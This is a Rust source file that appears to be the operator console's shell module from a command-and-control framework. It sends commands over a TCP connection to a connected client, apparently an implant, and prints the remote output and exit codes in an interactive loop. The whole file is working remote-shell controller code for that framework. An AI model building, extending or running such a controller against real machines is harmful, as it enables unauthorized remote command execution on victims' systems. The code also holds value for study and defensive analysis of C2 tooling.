use crate::{c2_state::C2State, constants::{self, DIM, CYAN, GREEN, RED, RESET, WHITE, YELLOW}};
use shared::{ClientMessage, InstructMessage, ShellCommand, utils::{read_message, send_message}};
use rustyline::DefaultEditor;
use std::net::TcpStream;


pub fn handle_command(instruct: String, conn: &mut TcpStream) -> Result<bool, String> {
    match send_message(conn, &ShellCommand::Command(instruct)) 
    {
        Ok(_) => (),
        Err(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:shell{RESET}{DIM}]{RESET} {YELLOW}instruct hasnt been sended:{RESET} {WHITE}{}{RESET}\n", e);
            return Err(e.to_string())
        }
    };

    let msg: ClientMessage = read_message(conn).map_err(|e| e.to_string())?;
    
    let out = match msg {
        ClientMessage::ShellOutput(out) => out,
        ClientMessage::Error(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:shell{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
            return Err(e)
        },
        _ => {
            println!("\n\t{DIM}[{RESET}{RED}err:shell{RESET}{DIM}]{RESET} {YELLOW}Response not recognized{RESET}\n");
            return Err("unknown response mensage".to_string()); 
        }
    };

    let exit_str = match out.exit_code {
        Some(code) => code.to_string(),
        None => "unknown".to_string(),
    };

    if !out.stdout.trim().is_empty() {
        println!(
            "\n{DIM}[{RESET}{GREEN}stdout{RESET}{DIM}]{RESET} \
            \t\t{DIM}[{RESET}{WHITE}exit{RESET}{DIM}]{RESET} {CYAN}{}{RESET}\n\
            \t{}",
            exit_str,
            out.stdout
        );
    }

    if !out.stderr.trim().is_empty() {
        println!(
            "\n{DIM}[{RESET}{RED}stderr{RESET}{DIM}]{RESET} \t\t{DIM}[{RESET}{WHITE}exit{RESET}{DIM}]{RESET} {CYAN}{}{RESET}\n\
            \t{}",
            exit_str,
            out.stderr
        );
    }

    Ok(true)
}


pub fn run(conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {
    match send_message(conn, &InstructMessage::Shell) {
        Ok(_) => (),
        Err(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:shell{RESET}{DIM}]{RESET} {YELLOW}instruct hasnt been sended:{RESET} {WHITE}{}{RESET}\n", e);
        }
    };

    println!("\n\t{DIM}[{RESET}{GREEN}shell{RESET}{DIM}]{RESET} {WHITE}Entering shell mode{RESET}\n");
    let mut rl = DefaultEditor::new().map_err(|e| e.to_string())?; // Another editor for shell mode
    state.set_mod("shell");

    loop {
        // Read from CLI
        let prompt = constants::build_prompt(&state);
        let instruct = rl.readline(&prompt).map_err(|e| e.to_string())?;

        if instruct.trim().to_ascii_lowercase() == "q" || instruct.trim().to_ascii_lowercase() == "exit"
        {
            match send_message(conn, &ShellCommand::Close){
                Ok(_) => break,
                Err(e) => {
                    println!("\n\t{DIM}[{RESET}{RED}err:shell{RESET}{DIM}]{RESET} {YELLOW}instruct hasnt been sended:{RESET} {WHITE}{}{RESET}\n", e);
                    continue;
                }
            }
            
        }

        if !instruct.trim().is_empty() 
        {
            let _ = rl.add_history_entry(instruct.as_str());
        }

        match handle_command(instruct.trim().to_string(), conn) 
        {
            Ok(b) if b => (),
            Err(err) => {
                println!("An error has ocurred: {}", err);
                continue;
            }
            _ => {
                state.set_mod("manager");
                break;
            }
        };
    }

    state.set_mod("operator");
    Ok(true)
}